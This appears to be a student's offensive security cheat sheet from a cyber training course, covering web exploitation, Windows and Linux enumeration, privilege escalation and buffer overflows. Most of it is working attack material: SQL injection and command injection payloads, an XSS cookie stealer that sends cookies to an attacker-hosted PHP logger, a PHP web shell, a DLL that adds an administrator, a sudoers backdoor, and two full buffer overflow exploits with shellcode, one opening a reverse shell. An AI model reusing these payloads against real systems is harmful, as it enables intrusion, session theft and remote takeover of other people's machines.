~~~ bash
#############################################################################################################################
#############################################################################################################################
######################################                                                 ######################################
######################################               CCTC Security Notes               ######################################
######################################                       by                        ######################################
######################################                 Travis Erickson                 ######################################
######################################                                                 ######################################
#############################################################################################################################
#############################################################################################################################


#############################################################################
#############################################################################
########################                             ########################
########################        Web Exploit          ########################
########################                             ########################
#############################################################################
#############################################################################

            ####################################################
            ################     Site Enum      ################
            ####################################################
# Site Enumeration -
proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse

# Right click and view page source!!! Often hidden links.

# For input fields that may be leveraging host commands
; whoami
; cat /etc/passwd
; mkdir /var/www/.ssh
; echo "mypubkey" | /var/www/.ssh/authorized_hosts

# For input fields that may be reading files on the system directly
../../../../../etc/hosts

# POST TO GET
http://website.com/login.html - # Try to login with Dev tools open, and watch the post request.
# Capture the login redirect (Switch from login.html > login.php), then go back and try it with GET (Using the URL)
http://website.com/login.php?username=Tom' or 1='1 & passwd=Tom' or 1='1 




# Curl requests
proxychains curl -s "http://10.100.28.55/books_pick.php?book=../../../../../var/log/auth.log.1" | sed -n '1,200p'

login.php - capture the login redirect, then go back and replace it with
login.php?username=Tom' or 1='1 & passwd=Tom' or 1='1


            ####################################################
            ################     SQL EXPLOIT    ################
            ####################################################

# Identification
proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>

# Logins
admin' OR 1=1;#'

# Identify vulnerable fields. Iterate through options (Product=1,=2=3=4...)
car=Audi or 1=1;# I'm not sure if Audi should be Audi'
product=1 or 1=1;#

# Once identified, determine column count. Start with number of columns presented and go up.
Audi' union select 1,2,3,4;#

# Golden Statemnet
Audi' UNION SELECT table_schema,TABLE_NAME, column_name FROM information_schema.columns;#'

# Use @@version to get database version/schema
UNION SELECT select 1,2,@@version

# Load Files
UNION SELECT select 1,2,LOAD_FILE('/ETC/PASSWD')


            ####################################################
            ################   Buffer Overflow  ################
            ####################################################

~~~ Bash
# wiremask for patterngenerator
https://wiremask.eu/tools/buffer-overflow-pattern-generator/

# Open in GDB if available. Remember, memory locations are machine specific on Linux, but are static on Windows.
gdb /path/to/file

run "This is where I'd put a pattern, if I had one"

# Capture the crash output and crossreference in wiremask to get buffer size.
# Get the start and end of stack
info proc map 

# Enter the start & end memory addresses, along with the search criteria for a jump esp/rsp
find /b 0xf7de2000 , 0xf7ffe000, 0xff, 0xe4

# Copy the first few, in case one doesn't work. This will be your EIP.
Original = ' 0xf7defb59 '
# That becomes:
EIP = "\x59\xfb\xde\xf7"

########################################
#####           METASPLOIT         #####
########################################
# If you need to build out a payload:  #
$:msfconsole                           #
$:search payload/windows/              #
$:search paylowd/linux/x86             #
$:use <Choose the number you searched> #
$:show options                         #
$:set <Whatever option> 'option info'  #
$:generate /b '\x00' -f python         #
########################################
# Always use windows/shell_reverse_tcp #
########################################

# See Examples at Bottom. In the end you will piece together.
print(BUFF+EIP+NOP+PAYLOAD)

# Then either of these depending on how the application works.
./func <<<(python ./exploit.py)
./func "$(python ./exploit.py)"

            ####################################################
            ################         XSS        ################
            ####################################################

# Add to a vulnerable chat to steal session cookies

# Create Cookie_Stealer1.php on your LinOps box, recommend in a unique director

<?php
$cookie = $_GET["username"];
$steal = fopen("/var/www/html/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>

# Start a python server in that directory
python3 -m http.server

# Paste this into chat
<script>document.location="http://<linopsip>:8000/Cookie_Stealer1.php?username=" + document.cookie;</script>

# Python server console will display connections.

            ####################################################
            ################  Malicious Upload  ################
            ####################################################

# Create a file; example is image.png.php
  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>

# Then identify the uploads directory and execute.
http://server/uploads/image.png.php


~~~ powershell
#############################################################################
#############################################################################
########################                             ########################
########################        Windows Enum         ########################
########################                             ########################
#############################################################################
#############################################################################


# The initial checks
whoami
ipconfig /all
Get-LocalGroupMember Administrators # or net localgroup administrators
netstat /anob   
net view
arp -a

# Search stuff
gci -r C:\users
gci -r C:\windows\temp
# Ping sweep
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up

# Security Log and Auditing require admin. PrivEsc
Auditpol /get /category:* 

# Check perms on a file
icacls \users\student\exercise_2

# Services
Get-CimInstance Win32_Service |
  Where-Object { -not $_.Description -or $_.Description -eq $null } |
  Select-Object Name, DisplayName, State, StartMode, PathName, StartName

## Scheduled Tasks
Get-ScheduledTask | Select-Object TaskName,TaskPath,State |
  ForEach-Object { $_; Get-ScheduledTaskInfo $_.TaskName -TaskPath $_.TaskPath 2>$null }
schtasks /query /fo LIST /v

## Run and RunOnce (User and Machine)
$runKeys = @(
 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run',
 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
)
foreach ($k in $runKeys) { if (Test-Path $k) { Write-Host "### $k"; Get-ItemProperty $k } }

## Startup Folders
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

## Auditing and Key Event IDs (Requires Admin)
auditpol /get /category:* # | findstr /i "success" "failure"

Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4624 } -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4625 } -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -FilterHashtable @{ LogName='System';   Id=7045 } -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -LogName 'Microsoft-Windows-TaskScheduler/Operational' -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterHashtable @{Id=4104} -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -LogName 'Microsoft-Windows-WMI-Activity/Operational' -MaxEvents 200 | Format-Table -Wrap

## Network Inventory
Get-NetTCPConnection | Sort-Object State,LocalPort | Format-Table -Auto
Get-NetUDPEndpoint   | Sort-Object LocalPort       | Format-Table -Auto
Get-Process -Id (Get-NetTCPConnection).OwningProcess -ErrorAction SilentlyContinue |  Select-Object Id, ProcessName, Path
Get-SmbShare
net share

``` bash

#############################################################################
#############################################################################
########################                             ########################
########################         Linux Enum          ########################
########################                             ########################
#############################################################################
#############################################################################

            ####################################################
            ################      Enum Host     ################
            ####################################################
whoami
hostname
sudo -l
cat /etc/hosts
cat /etc/passwd 
cat /etc/group
# Show only login shell users
awk -F: '$7 !~ /(nologin|false)$/ {print $1 ":" $7}' /etc/passwd
grep -Ev ':(/sbin/nologin|/bin/false)$' /etc/passwd
# Running Processes
ps auxf
# Scheduled Tasks
cat /etc/crontab
ls -l /etc/cron.*
crontab -l
# Check if something is installed
which sl # example
whereis sl 
arp -an

# Search stuff
find / -type f -iname "filename"
find / -type d -iname "directory"

find /tmp
find /var/tmp
find /usr/share
find /root
# Find writable files
find / -type f -writable -o -type d -writable 2>/dev/null

# Logs
/var/log
    auth.log/secure # Logins/Auths
    syslog
    RSYSLOG # Means there is remote logging

            ####################################################
            ################    Enum Network    ################
            ####################################################
# NIC and neighbor
ip a
ip nei
# Get static routes
cat /etc/hosts
cat /etc/resolv.conf
netstat -p -a -l -o -n -t -u 2>/dev/null

# Ping Sweep
for i in {2..254}; do (/bin/ping -c 1 192.168.28.$i | grep "bytes from" &); done
# Find open ports
proxychains nmap -Pn -sT 10.0.0.X -p 1-10000
# Get the version info of open ports
proxychains nmap -Pn -sV 10.0.0.X -p 80
# Scripts to get additional info
proxychains nmap -Pn -sT 10.0.0.X --script smb-os-discovery.nse
proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse

            ####################################################
            ################   Linux Commands   ################
            ####################################################

# RDP stuff
xfreerdp /v:10.50.x.x /u:student /p:password /size:1920x1000 +clipboard

# Set permission to user only read and write
chmod 600 /home/user/stolenkey

# /etc/sudoers gives all sudo permissions
echo "student ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

# Check how files run
find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files

# Fine grained permissions assigned to apps
getcap -r / 2>/dev/null

# Get more info on a file. I don't use this much.
file filename 
objdump filename | more
strings filename

# Adjust your PATH variable to take advantage of relative paths
echo $PATH
export PATH='.:'$PATH

#############################################################################
#############################################################################
########################                             ########################
########################     Privilege Escelation    ########################
########################                             ########################
#############################################################################
#############################################################################

            ####################################################
            ################  Reverse Engineer  ################
            ####################################################

# 1. Identify object to analyze
# 2. Static Analysis
# 3. Behavorial Analysis
# 4. Dynamic Analysis
# 5. Disassembly
# 6. Document Binary Capability
# 7. Create Exploit
# REF: https://sec-cted-tech-college-cttsb-cctc-sec-12e0e75a1babbeec38083447b9.cybbh.io/_downloads/Reverse_engineering_workflow.pdf

            ####################################################
            ################     SSH Exploit    ################
            ####################################################
# Add/Hijacking user account via ssh and id_rsa.pub
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub
# Add your pub key to their authorized keys
echo "key data" >> /var/www/.ssh/authorized_keys
# Access their system with their username
ssh www-data@targetip

# Or if you steal an ssh key, you can reference it explicitely
ssh -i ./stolenstuff/stolenkey victim@10.20.30.40


# Boot process persistence
# CRON jobs
# Kernel module w/ backdoor

            ####################################################
            ################  DLL Highjacking   ################
            ####################################################

                    ##################################
                    # Identify the vulnerable dll    #
                    # Create a .c file               #  
                    # Convert to DLL                 #
                    # Input it in same folder as app #
                    ##################################
# Create file: vuln.c
``` C
#include <windows.h>
int execCommand()
{
 WinExec("cmd /C net localgroup administrators aaron /add", 1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}
```
# Convert your file to a dll
i686-w64-mingw32-g++ -c vuln.c -o vuln.o
i686-w64-mingw32-g++ -shared -o vuln.dll vuln.o -Wl,--out-implib,vuln.a

# Rename file to whatever your dll should be named below is putty's.
SSPICLI.dll

            ####################################################
            ################      SUID GUID     ################
            ####################################################

# Identify vulnerable files, be sure to compare for anything different from LinOps host
find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files

# Identify vulnerable binaries in GTFOBins
https://gtfobins.github.io/

# NMAP Example
echo 'os.execute ("/bin/bash")' > /tmp/escape.nse
chmod +x /tmp/escape.nse
nmap --script=/tmp/escape.nse

# 'find' Example
find . -exec /bin/sh -p \; -quit

            ####################################################
            ################   Winders Exploit  ################
            ####################################################

# Services and SchTasks typically run under System

# Open services and look for any with no description
# See if you have rights to replace any files in service path to executable
#       NOTE: Services often require a reboot
# Same for scheduled tasks
# Unquoted Paths:
#       c:\Program Files\A Directory\file will first try to execute C:\Program Files\A.exe



#############################################################################
#############################################################################
########################                             ########################
########################       Buffer Overflow       ########################
########################          EXAMPLES           ########################
#############################################################################
#############################################################################

# cat /var/tmp/exploit_me | md5sum
# 3be69f16ad978f9e2508ae6e56c56488

# cat try.py for exploit_me md5sum > 3be69f16ad978f9e2508ae6e56c56488
~~~ python
#!/usr/bin/python
command = "A"*55
RIP="\x59\xfb\xde\xf7"
NOP="\x90"*10

'''
0xf7defb59
0xf7f648ab
0xf7f705fb
0xf7f7060f
0xf7f70aeb
'''

# linux/x86/exec - 70 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=/bin/sh, NullFreeVersion=false
buf =  b""
buf += b"\xb8\x3e\xce\xe0\xf0\xdb\xcc\xd9\x74\x24\xf4\x5f"
buf += b"\x2b\xc9\xb1\x0b\x83\xef\xfc\x31\x47\x11\x03\x47"
buf += b"\x11\xe2\xcb\xa4\xeb\xa8\xaa\x6b\x8a\x20\xe1\xe8"
buf += b"\xdb\x56\x91\xc1\xa8\xf0\x61\x76\x60\x63\x08\xe8"
buf += b"\xf7\x80\x98\x1c\x0f\x47\x1c\xdd\x3f\x25\x75\xb3"
buf += b"\x10\xda\xed\x4b\x38\x4f\x64\xaa\x0b\xef"
print(command+RIP+NOP+buf)
~~~

# cat DEV/ex.py for SecureServer
~~~ python
#!/usr/bin/python
import socket

command = "TRUN /.:/"
characters = ""
BUFF="A"*2003
EIP="\xA0\x12\x50\x62"
NOP="\x90"*10

# windows/shell_reverse_tcp - 351 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LHOST=10.50.162.120, LPORT=4444, MY IP ADDRESS
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, CreateSession=true, 
# AutoVerifySession=true
buf =  b""
buf += b"\xdd\xc1\xba\x25\x45\xca\xf7\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\x73"
buf += b"\x56\x28\x02\x87\xb0\x2e\xed\x77\x41\x4f\x67\x92"
buf += b"\x70\x4f\x13\xd7\x23\x7f\x57\xb5\xcf\xf4\x35\x2d"
buf += b"\x5b\x78\x92\x42\xec\x37\xc4\x6d\xed\x64\x34\xec"
buf += b"\x6d\x77\x69\xce\x4c\xb8\x7c\x0f\x88\xa5\x8d\x5d"
buf += b"\x41\xa1\x20\x71\xe6\xff\xf8\xfa\xb4\xee\x78\x1f"
buf += b"\x0c\x10\xa8\x8e\x06\x4b\x6a\x31\xca\xe7\x23\x29"
buf += b"\x0f\xcd\xfa\xc2\xfb\xb9\xfc\x02\x32\x41\x52\x6b"
buf += b"\xfa\xb0\xaa\xac\x3d\x2b\xd9\xc4\x3d\xd6\xda\x13"
buf += b"\x3f\x0c\x6e\x87\xe7\xc7\xc8\x63\x19\x0b\x8e\xe0"
buf += b"\x15\xe0\xc4\xae\x39\xf7\x09\xc5\x46\x7c\xac\x09"
buf += b"\xcf\xc6\x8b\x8d\x8b\x9d\xb2\x94\x71\x73\xca\xc6"
buf += b"\xd9\x2c\x6e\x8d\xf4\x39\x03\xcc\x90\x8e\x2e\xee"
buf += b"\x60\x99\x39\x9d\x52\x06\x92\x09\xdf\xcf\x3c\xce"
buf += b"\x20\xfa\xf9\x40\xdf\x05\xfa\x49\x24\x51\xaa\xe1"
buf += b"\x8d\xda\x21\xf1\x32\x0f\xe5\xa1\x9c\xe0\x46\x11"
buf += b"\x5d\x51\x2f\x7b\x52\x8e\x4f\x84\xb8\xa7\xfa\x7f"
buf += b"\x2b\xc2\xc8\xdd\xd3\xba\x2e\x21\x35\x67\xa6\xc7"
buf += b"\x5f\x87\xee\x50\xc8\x3e\xab\x2a\x69\xbe\x61\x57"
buf += b"\xa9\x34\x86\xa8\x64\xbd\xe3\xba\x11\x4d\xbe\xe0"
buf += b"\xb4\x52\x14\x8c\x5b\xc0\xf3\x4c\x15\xf9\xab\x1b"
buf += b"\x72\xcf\xa5\xc9\x6e\x76\x1c\xef\x72\xee\x67\xab"
buf += b"\xa8\xd3\x66\x32\x3c\x6f\x4d\x24\xf8\x70\xc9\x10"
buf += b"\x54\x27\x87\xce\x12\x91\x69\xb8\xcc\x4e\x20\x2c"
buf += b"\x88\xbc\xf3\x2a\x95\xe8\x85\xd2\x24\x45\xd0\xed"
buf += b"\x89\x01\xd4\x96\xf7\xb1\x1b\x4d\xbc\xc2\x51\xcf"
buf += b"\x95\x4a\x3c\x9a\xa7\x16\xbf\x71\xeb\x2e\x3c\x73"
buf += b"\x94\xd4\x5c\xf6\x91\x91\xda\xeb\xeb\x8a\x8e\x0b"
buf += b"\x5f\xaa\x9a"

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.28.189",9999)) #Remote Server
print(s.recv(1024))
s.send(command+BUFF+EIP+NOP+buf)
print(s.recv(1024))
~~~